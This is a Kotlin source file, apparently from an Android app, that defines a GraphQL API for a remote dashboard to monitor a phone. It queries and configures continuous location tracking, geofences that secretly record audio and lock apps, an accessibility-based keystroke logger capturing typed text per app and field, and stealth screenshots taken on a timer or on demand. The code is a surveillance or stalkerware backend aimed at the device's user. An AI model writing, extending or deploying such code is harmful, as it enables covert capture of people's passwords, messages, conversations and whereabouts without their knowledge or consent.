package com.ismartcoding.plain.web.schemas

import com.ismartcoding.lib.kgraphql.schema.dsl.SchemaBuilder
import com.ismartcoding.plain.MainApp
import com.ismartcoding.plain.helpers.GeofencingHelper
import com.ismartcoding.plain.helpers.KeystrokeLogHelper
import com.ismartcoding.plain.helpers.LocationTrackingHelper
import com.ismartcoding.plain.helpers.StealthScreenshotCapturer
import com.ismartcoding.plain.helpers.StealthScreenshotHelper
import com.ismartcoding.plain.services.LocationTrackingService
import kotlinx.coroutines.runBlocking
import kotlinx.serialization.Serializable

@Serializable
data class LocationPointModel(
    val ts: Long,
    val lat: Double,
    val lng: Double,
    val accuracy: Double,
    val speed: Double,
    val altitude: Double,
    val bearing: Double,
    val battery: Int,
    val charging: Boolean,
    val provider: String,
)

@Serializable
data class LocationTrackingState(
    val enabled: Boolean,
    val running: Boolean,
    val intervalSec: Int,
    val minDisplacement: Int,
    val totalPoints: Int,
    val latest: LocationPointModel?,
)

@Serializable
data class GeofenceModel(
    val id: String,
    val name: String,
    val lat: Double,
    val lng: Double,
    val radius: Double,
    val color: String,
    val enabled: Boolean,
    val triggerEnter: Boolean,
    val triggerExit: Boolean,
    val actionRecordAudio: Boolean,
    val recordAudioSec: Int,
    val actionNotifyWeb: Boolean,
    val actionLockApps: Boolean,
    val lockedAppIds: List<String>,
    val lockAppsDurationSec: Int,
    val customNote: String,
    val createdAt: Long,
    val currentlyInside: Boolean,
)

@Serializable
data class GeofenceEventModel(
    val id: String,
    val geofenceId: String,
    val geofenceName: String,
    val type: String,
    val ts: Long,
    val lat: Double,
    val lng: Double,
    val accuracy: Double,
    val batteryLevel: Int,
    val recordingFile: String,
    val recordingDurationMs: Long,
    val notifiedWeb: Boolean,
    val lockedApps: List<String>,
)

@Serializable
data class GeofenceAudioModel(
    val id: String,
    val geofenceId: String,
    val geofenceName: String,
    val eventId: String,
    val ts: Long,
    val durationMs: Long,
    val sizeBytes: Long,
    val fileId: String,
)

@Serializable
data class KeystrokeEntryModel(
    val id: String,
    val ts: Long,
    val packageName: String,
    val appLabel: String,
    val fieldHint: String,
    val text: String,
)

@Serializable
data class KeystrokePackageStat(
    val packageName: String,
    val count: Int,
)

@Serializable
data class KeystrokeState(
    val enabled: Boolean,
    val accessibilityServiceConnected: Boolean,
    val bufferLimit: Int,
    val totalEntries: Int,
)

@Serializable
data class StealthScreenshotModel(
    val id: String,
    val ts: Long,
    val packageName: String,
    val appLabel: String,
    val width: Int,
    val height: Int,
    val sizeBytes: Long,
    val manual: Boolean,
    val fileId: String,
)

@Serializable
data class StealthScreenshotState(
    val enabled: Boolean,
    val accessibilityServiceConnected: Boolean,
    val supportedByOs: Boolean,
    val intervalMin: Int,
    val keepCount: Int,
    val totalShots: Int,
)

@Serializable
data class TrackingFenceInput(
    val id: String = "",
    val name: String,
    val lat: Double,
    val lng: Double,
    val radius: Double,
    val color: String = "#6366f1",
    val enabled: Boolean = true,
    val triggerEnter: Boolean = true,
    val triggerExit: Boolean = true,
    val actionRecordAudio: Boolean = false,
    val recordAudioSec: Int = 30,
    val actionNotifyWeb: Boolean = true,
    val actionLockApps: Boolean = false,
    val lockedAppIds: List<String> = emptyList(),
    val lockAppsDurationSec: Int = 0,
    val customNote: String = "",
)

private fun LocationTrackingHelper.Point.toModel(): LocationPointModel = LocationPointModel(
    ts = ts, lat = lat, lng = lng,
    accuracy = accuracy.toDouble(),
    speed = speed.toDouble(),
    altitude = altitude,
    bearing = bearing.toDouble(),
    battery = batteryLevel,
    charging = charging,
    provider = provider,
)

private fun GeofencingHelper.Geofence.toModel(insideMap: Map<String, Boolean>): GeofenceModel = GeofenceModel(
    id = id, name = name, lat = lat, lng = lng, radius = radius, color = color,
    enabled = enabled,
    triggerEnter = triggerEnter, triggerExit = triggerExit,
    actionRecordAudio = actionRecordAudio, recordAudioSec = recordAudioSec,
    actionNotifyWeb = actionNotifyWeb,
    actionLockApps = actionLockApps,
    lockedAppIds = lockedAppIds,
    lockAppsDurationSec = lockAppsDurationSec,
    customNote = customNote,
    createdAt = createdAt,
    currentlyInside = insideMap[id] ?: false,
)

private fun GeofencingHelper.GeofenceEvent.toModel(): GeofenceEventModel = GeofenceEventModel(
    id = id, geofenceId = geofenceId, geofenceName = geofenceName,
    type = type, ts = ts, lat = lat, lng = lng,
    accuracy = accuracy.toDouble(),
    batteryLevel = batteryLevel,
    recordingFile = recordingFile,
    recordingDurationMs = recordingDurationMs,
    notifiedWeb = notifiedWeb,
    lockedApps = lockedApps,
)

private fun KeystrokeLogHelper.Entry.toModel(): KeystrokeEntryModel = KeystrokeEntryModel(
    id = id, ts = ts, packageName = packageName, appLabel = appLabel,
    fieldHint = fieldHint, text = text,
)

private fun StealthScreenshotHelper.Shot.toModel(): StealthScreenshotModel = StealthScreenshotModel(
    id = id, ts = ts, packageName = packageName, appLabel = appLabel,
    width = width, height = height, sizeBytes = sizeBytes,
    manual = manual, fileId = id,
)

private fun GeofencingHelper.GeofenceAudio.toModel(): GeofenceAudioModel = GeofenceAudioModel(
    id = id,
    geofenceId = geofenceId,
    geofenceName = geofenceName,
    eventId = eventId,
    ts = ts,
    durationMs = durationMs,
    sizeBytes = sizeBytes,
    fileId = id,
)

fun SchemaBuilder.addTrackingSchema() {
    // ---- LOCATION TRACKING ----

    query("locationTrackingState") {
        resolver { ->
            LocationTrackingState(
                enabled = LocationTrackingHelper.isEnabled(),
                running = LocationTrackingService.isRunning(),
                intervalSec = LocationTrackingHelper.getIntervalSec(),
                minDisplacement = LocationTrackingHelper.getMinDisplacement(),
                totalPoints = LocationTrackingHelper.countPoints(),
                latest = LocationTrackingHelper.latestPoint()?.toModel(),
            )
        }
    }

    query("locationPoints") {
        resolver { offset: Int, limit: Int, fromTs: String, toTs: String ->
            val from = fromTs.toLongOrNull() ?: 0L
            val to = toTs.toLongOrNull() ?: 0L
            LocationTrackingHelper.listPoints(offset, limit, from, to).map { it.toModel() }
        }
    }

    query("locationPointsCount") {
        resolver { fromTs: String, toTs: String ->
            val from = fromTs.toLongOrNull() ?: 0L
            val to = toTs.toLongOrNull() ?: 0L
            if (from <= 0L && to <= 0L) LocationTrackingHelper.countPoints()
            else LocationTrackingHelper.countPointsInRange(from, to)
        }
    }

    mutation("setLocationTrackingEnabled") {
        resolver { enabled: Boolean ->
            LocationTrackingHelper.setEnabled(enabled)
            if (enabled) LocationTrackingService.start(MainApp.instance)
            else LocationTrackingService.stop(MainApp.instance)
            true
        }
    }

    mutation("setLocationTrackingInterval") {
        resolver { seconds: Int, minDisplacement: Int ->
            LocationTrackingHelper.setIntervalSec(seconds)
            LocationTrackingHelper.setMinDisplacement(minDisplacement)
            LocationTrackingService.refreshInterval(MainApp.instance)
            true
        }
    }

    mutation("clearLocationHistory") {
        resolver { ->
            LocationTrackingHelper.clear()
            true
        }
    }

    mutation("bulkDeleteLocationPoints") {
        resolver { fromTs: String, toTs: String, olderThanN: Int ->
            val from = fromTs.toLongOrNull() ?: 0L
            val to = toTs.toLongOrNull() ?: 0L
            LocationTrackingHelper.bulkDelete(from, to, olderThanN)
        }
    }

    // ---- GEOFENCES ----

    query("geofences") {
        resolver { ->
            val inside = GeofencingHelper.readInside()
            GeofencingHelper.listFences().map { it.toModel(inside) }
        }
    }

    query("geofenceEvents") {
        resolver { offset: Int, limit: Int, geofenceId: String ->
            GeofencingHelper.listEvents(offset, limit, geofenceId).map { it.toModel() }
        }
    }

    query("geofenceAudios") {
        resolver { offset: Int, limit: Int, geofenceId: String ->
            GeofencingHelper.listAudios(offset, limit, geofenceId).map { it.toModel() }
        }
    }

    mutation("saveGeofence") {
        resolver { input: TrackingFenceInput ->
            val existing = if (input.id.isNotEmpty()) GeofencingHelper.getFence(input.id) else null
            val toSave = if (existing != null) {
                existing.apply {
                    name = input.name
                    lat = input.lat
                    lng = input.lng
                    radius = input.radius
                    color = input.color
                    enabled = input.enabled
                    triggerEnter = input.triggerEnter
                    triggerExit = input.triggerExit
                    actionRecordAudio = input.actionRecordAudio
                    recordAudioSec = input.recordAudioSec.coerceIn(5, 600)
                    actionNotifyWeb = input.actionNotifyWeb
                    actionLockApps = input.actionLockApps
                    lockedAppIds = input.lockedAppIds
                    lockAppsDurationSec = input.lockAppsDurationSec.coerceAtLeast(0)
                    customNote = input.customNote
                }
            } else {
                GeofencingHelper.Geofence(
                    id = com.ismartcoding.lib.helpers.StringHelper.shortUUID(),
                    name = input.name,
                    lat = input.lat,
                    lng = input.lng,
                    radius = input.radius,
                    color = input.color,
                    enabled = input.enabled,
                    triggerEnter = input.triggerEnter,
                    triggerExit = input.triggerExit,
                    actionRecordAudio = input.actionRecordAudio,
                    recordAudioSec = input.recordAudioSec.coerceIn(5, 600),
                    actionNotifyWeb = input.actionNotifyWeb,
                    actionLockApps = input.actionLockApps,
                    lockedAppIds = input.lockedAppIds,
                    lockAppsDurationSec = input.lockAppsDurationSec.coerceAtLeast(0),
                    customNote = input.customNote,
                )
            }
            val saved = GeofencingHelper.saveFence(toSave)
            saved.toModel(GeofencingHelper.readInside())
        }
    }

    mutation("deleteGeofence") {
        resolver { id: String ->
            GeofencingHelper.deleteFence(id)
            true
        }
    }

    mutation("deleteGeofenceAudio") {
        resolver { id: String -> GeofencingHelper.deleteAudio(id) }
    }

    // ---- KEYSTROKE LOGGER ----

    query("keystrokeState") {
        resolver { ->
            KeystrokeState(
                enabled = KeystrokeLogHelper.isEnabled(),
                accessibilityServiceConnected =
                    com.ismartcoding.plain.services.PlainAccessibilityService.isEnabled(),
                bufferLimit = KeystrokeLogHelper.getBufferLimit(),
                totalEntries = KeystrokeLogHelper.count(),
            )
        }
    }

    query("keystrokeEntries") {
        resolver { offset: Int, limit: Int, query: String, packageName: String, fromTs: String, toTs: String ->
            val from = fromTs.toLongOrNull() ?: 0L
            val to = toTs.toLongOrNull() ?: 0L
            KeystrokeLogHelper.list(offset, limit, query, packageName, from, to).map { it.toModel() }
        }
    }

    query("keystrokeEntriesCount") {
        resolver { query: String, packageName: String, fromTs: String, toTs: String ->
            val from = fromTs.toLongOrNull() ?: 0L
            val to = toTs.toLongOrNull() ?: 0L
            KeystrokeLogHelper.count(query, packageName, from, to)
        }
    }

    query("keystrokePackageStats") {
        resolver { ->
            KeystrokeLogHelper.packageBreakdown().map { (pkg, n) -> KeystrokePackageStat(pkg, n) }
        }
    }

    mutation("setKeystrokeLoggerEnabled") {
        resolver { enabled: Boolean ->
            KeystrokeLogHelper.setEnabled(enabled)
            true
        }
    }

    mutation("setKeystrokeBufferLimit") {
        resolver { limit: Int ->
            KeystrokeLogHelper.setBufferLimit(limit)
            true
        }
    }

    mutation("clearKeystrokeLog") {
        resolver { ->
            KeystrokeLogHelper.clear()
            true
        }
    }

    mutation("deleteKeystrokeEntry") {
        resolver { id: String -> KeystrokeLogHelper.deleteOne(id) }
    }

    mutation("bulkDeleteKeystrokes") {
        resolver { fromTs: String, toTs: String, packageName: String, olderThanN: Int ->
            val from = fromTs.toLongOrNull() ?: 0L
            val to = toTs.toLongOrNull() ?: 0L
            KeystrokeLogHelper.bulkDelete(from, to, packageName, olderThanN)
        }
    }

    // ---- STEALTH SCREENSHOT ----

    query("stealthScreenshotState") {
        resolver { ->
            StealthScreenshotState(
                enabled = StealthScreenshotHelper.isEnabled(),
                accessibilityServiceConnected =
                    com.ismartcoding.plain.services.PlainAccessibilityService.isEnabled(),
                supportedByOs = android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R,
                intervalMin = StealthScreenshotHelper.getIntervalMin(),
                keepCount = StealthScreenshotHelper.getKeepCount(),
                totalShots = StealthScreenshotHelper.count(),
            )
        }
    }

    query("stealthScreenshots") {
        resolver { offset: Int, limit: Int ->
            StealthScreenshotHelper.list(offset, limit).map { it.toModel() }
        }
    }

    mutation("setStealthScreenshotEnabled") {
        resolver { enabled: Boolean ->
            StealthScreenshotHelper.setEnabled(enabled)
            true
        }
    }

    mutation("setStealthScreenshotConfig") {
        resolver { intervalMin: Int, keepCount: Int ->
            StealthScreenshotHelper.setIntervalMin(intervalMin.coerceIn(1, 360))
            StealthScreenshotHelper.setKeepCount(keepCount.coerceIn(10, 1000))
            true
        }
    }

    mutation("triggerStealthScreenshot") {
        resolver { ->
            // Manual capture from the dashboard — runs the same async path as
            // the periodic worker but blocks until we know whether the OS
            // produced an image so the UI can react with a toast.
            val shot = runBlocking { StealthScreenshotCapturer.captureNow(manual = true) }
            shot != null
        }
    }

    mutation("deleteStealthScreenshot") {
        resolver { id: String -> StealthScreenshotHelper.deleteOne(id) }
    }

    mutation("clearStealthScreenshots") {
        resolver { ->
            StealthScreenshotHelper.clearAll()
            true
        }
    }
}
